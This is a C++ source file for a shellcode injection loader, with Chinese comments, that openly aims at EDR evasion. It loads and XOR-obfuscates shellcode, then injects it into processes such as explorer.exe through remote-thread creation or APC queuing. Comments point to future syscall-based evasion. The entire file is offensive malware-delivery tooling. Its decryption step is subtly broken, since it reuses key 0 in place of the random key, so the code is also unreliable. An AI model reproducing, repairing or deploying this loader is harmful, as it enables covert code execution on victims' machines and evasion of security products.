// ====================================================================
//  进程注入加载器 v11.0 - 改进版（2025-2026 视角）
//  目标：提高可维护性、内存安全、部分EDR规避潜力
// ====================================================================

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <string_view>
#include <fstream>
#include <random>
#include <span>
#include <tlhelp32.h>
#include <winternl.h>
#include <memory>

// wil风格的简单RAII句柄（可替换为Microsoft::WRL::ComPtr或wil）
template<typename T, auto Deleter>
struct Handle {
    T value = nullptr;
    Handle() = default;
    explicit Handle(T v) : value(v) {}
    ~Handle() { if (value) Deleter(value); }
    Handle(const Handle&) = delete;
    Handle& operator=(const Handle&) = delete;
    Handle(Handle&& other) noexcept : value(other.value) { other.value = nullptr; }
    Handle& operator=(Handle&& other) noexcept {
        if (this != &other) { if (value) Deleter(value); value = other.value; other.value = nullptr; }
        return *this;
    }
    T get() const { return value; }
    explicit operator bool() const { return value != nullptr; }
};

// 常用句柄类型
using ProcessHandle  = Handle<HANDLE, [](HANDLE h){ if(h) CloseHandle(h); }>;
using ThreadHandle   = Handle<HANDLE, [](HANDLE h){ if(h) CloseHandle(h); }>;
using SnapshotHandle = Handle<HANDLE, [](HANDLE h){ if(h) CloseHandle(h); }>;

// ──────────────────────────────────────────────

#pragma comment(lib, "wininet.lib")

class InjectionLoader {
private:
    std::vector<std::uint8_t> shellcode;        // 已加密
    std::vector<std::uint8_t> original;         // 明文（加载后尽快清理）
    std::mt19937_64 rng{std::random_device{}()};

    // 更强的加密示例：简单ChaCha-like （生产环境请用libsodium或手写完整ChaCha20）
    // 这里仅演示，实际建议用成熟库或完整实现
    void XorCrypt(std::span<std::uint8_t> data, std::uint64_t key) {
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= static_cast<std::uint8_t>(key >> (i % 8 * 8));
            data[i] ^= static_cast<std::uint8_t>((key >> 32) ^ i);
        }
    }

public:
    InjectionLoader() = default;

    void SecureWipe(std::span<std::uint8_t> buf) {
        if (!buf.empty()) {
            SecureZeroMemory(buf.data(), buf.size());
        }
    }

    bool LoadFromFile(std::string_view path) {
        std::ifstream f(path.data(), std::ios::binary | std::ios::ate);
        if (!f) {
            std::cerr << "[-] Cannot open file\n";
            return false;
        }

        auto size = f.tellg();
        if (size <= 0) return false;

        original.resize(static_cast<size_t>(size));
        f.seekg(0);
        f.read(reinterpret_cast<char*>(original.data()), size);

        shellcode = original;
        auto key = rng();
        XorCrypt(shellcode, key);

        SecureWipe(original); // 明文尽快清理
        std::cout << "[+] Loaded & encrypted shellcode (" << shellcode.size() << " bytes)\n";
        return true;
    }

    bool LoadFromHex(std::string_view hex) {
        if (hex.size() % 2 != 0) return false;

        original.clear();
        original.reserve(hex.size() / 2);

        for (size_t i = 0; i < hex.size(); i += 2) {
            std::string byte_str{hex.substr(i, 2)};
            char* end = nullptr;
            auto b = static_cast<std::uint8_t>(std::strtoul(byte_str.c_str(), &end, 16));
            if (end == byte_str.c_str()) return false;
            original.push_back(b);
        }

        shellcode = original;
        auto key = rng();
        XorCrypt(shellcode, key);

        SecureWipe(original);
        std::cout << "[+] Hex shellcode loaded & encrypted (" << shellcode.size() << " bytes)\n";
        return true;
    }

private:
    bool ClassicInjectSyscall(DWORD pid) {
        // 未来可替换为动态syscall stub，这里仅占位
        // 需要Hell's Gate / fresh ntdll 等技术支持
        std::cerr << "[!] Syscall classic not implemented yet\n";
        return ClassicInjectNormal(pid);
    }

    bool ClassicInjectNormal(DWORD pid) {
        if (shellcode.empty()) return false;

        ProcessHandle proc{ OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) };
        if (!proc) {
            std::cerr << "[-] OpenProcess failed\n";
            return false;
        }

        std::vector<std::uint8_t> plain = shellcode;
        XorCrypt(plain, 0); // 解密（这里简化，实际应使用保存的key或IV）

        LPVOID remote = VirtualAllocEx(proc.get(), nullptr, plain.size(),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote) {
            std::cerr << "[-] VirtualAllocEx failed\n";
            return false;
        }

        SIZE_T written = 0;
        if (!WriteProcessMemory(proc.get(), remote, plain.data(), plain.size(), &written)) {
            std::cerr << "[-] WriteProcessMemory failed\n";
            VirtualFreeEx(proc.get(), remote, 0, MEM_RELEASE);
            return false;
        }

        DWORD old = 0;
        VirtualProtectEx(proc.get(), remote, plain.size(), PAGE_EXECUTE_READ, &old);

        ThreadHandle thread{ CreateRemoteThread(proc.get(), nullptr, 0,
                                                (LPTHREAD_START_ROUTINE)remote, nullptr, 0, nullptr) };
        if (!thread) {
            std::cerr << "[-] CreateRemoteThread failed\n";
            VirtualFreeEx(proc.get(), remote, 0, MEM_RELEASE);
            return false;
        }

        WaitForSingleObject(thread.get(), 1500);
        std::cout << "[+] Classic injection (normal) completed\n";
        SecureWipe(plain);
        return true;
    }

    bool APCInject(DWORD pid) {
        // 同上，可扩展为syscall版本 NtQueueApcThread
        // 这里保持原逻辑，但使用RAII
        if (shellcode.empty()) return false;

        ProcessHandle proc{ OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) };
        if (!proc) return false;

        std::vector<std::uint8_t> plain = shellcode;
        XorCrypt(plain, 0); // 解密

        LPVOID remote = VirtualAllocEx(proc.get(), nullptr, plain.size(),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote) return false;

        SIZE_T written{};
        if (!WriteProcessMemory(proc.get(), remote, plain.data(), plain.size(), &written)) {
            VirtualFreeEx(proc.get(), remote, 0, MEM_RELEASE);
            return false;
        }

        DWORD old{};
        VirtualProtectEx(proc.get(), remote, plain.size(), PAGE_EXECUTE_READ, &old);

        SnapshotHandle snap{ CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
        if (!snap) {
            VirtualFreeEx(proc.get(), remote, 0, MEM_RELEASE);
            return false;
        }

        THREADENTRY32 te{ sizeof(te) };
        bool success = false;

        if (Thread32First(snap.get(), &te)) {
            do {
                if (te.th32OwnerProcessID != pid) continue;

                ThreadHandle th{ OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID) };
                if (!th) continue;

                if (QueueUserAPC((PAPCFUNC)remote, th.get(), 0)) {
                    std::cout << "[+] APC queued to TID " << te.th32ThreadID << "\n";
                    success = true;
                    break;
                }
            } while (Thread32Next(snap.get(), &te));
        }

        SecureWipe(plain);
        return success;
    }

public:
    bool InjectToProcess(std::wstring_view procName, std::string_view method = "classic") {
        DWORD pid = GetProcessIdByName(procName);
        if (pid == 0) {
            std::wcerr << L"[-] Process not found: " << procName << L"\n";
            return false;
        }

        std::wcout << L"[*] Target PID: " << pid << L"\n";

        if (method == "syscall") {
            return ClassicInjectSyscall(pid);
        }
        else if (method == "apc") {
            return APCInject(pid);
        }
        else {
            return ClassicInjectNormal(pid);
        }
    }

private:
    DWORD GetProcessIdByName(std::wstring_view name) {
        SnapshotHandle snap{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
        if (!snap) return 0;

        PROCESSENTRY32W pe{ sizeof(pe) };
        if (!Process32FirstW(snap.get(), &pe)) return 0;

        do {
            if (_wcsicmp(name.data(), pe.szExeFile) == 0) {
                return pe.th32ProcessID;
            }
        } while (Process32NextW(snap.get(), &pe));

        return 0;
    }
};

// ──────────────────────────────────────────────

void PrintUsage() {
    std::cout <<
        "Usage:\n"
        "  loader.exe -i shellcode.bin [-p notepad.exe] [-m classic|apc|syscall]\n"
        "  loader.exe -h 4831c0... [-p explorer.exe] [-m apc]\n\n"
        "Default: -p explorer.exe -m classic\n";
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        PrintUsage();
        return 1;
    }

    InjectionLoader loader;
    std::wstring target = L"explorer.exe";
    std::string method = "classic";
    bool loaded = false;

    for (int i = 1; i < argc; ++i) {
        std::string_view arg{argv[i]};

        if (arg == "-i" && i+1 < argc) {
            loaded = loader.LoadFromFile(argv[++i]);
        }
        else if (arg == "-h" && i+1 < argc) {
            loaded = loader.LoadFromHex(argv[++i]);
        }
        else if (arg == "-p" && i+1 < argc) {
            std::string s{argv[++i]};
            target.assign(s.begin(), s.end());
        }
        else if (arg == "-m" && i+1 < argc) {
            method = argv[++i];
            if (method != "classic" && method != "apc" && method != "syscall") {
                std::cerr << "[-] Unknown method\n";
                return 1;
            }
        }
    }

    if (!loaded) {
        std::cerr << "[-] No shellcode provided\n";
        return 1;
    }

    std::wcout << L"[*] Injecting into: " << target << L"  method: " << method << L"\n";

    if (loader.InjectToProcess(target, method)) {
        std::cout << "[+] Injection appears successful\n";
        return 0;
    }

    std::cout << "[-] Injection failed\n";
    return 1;
}
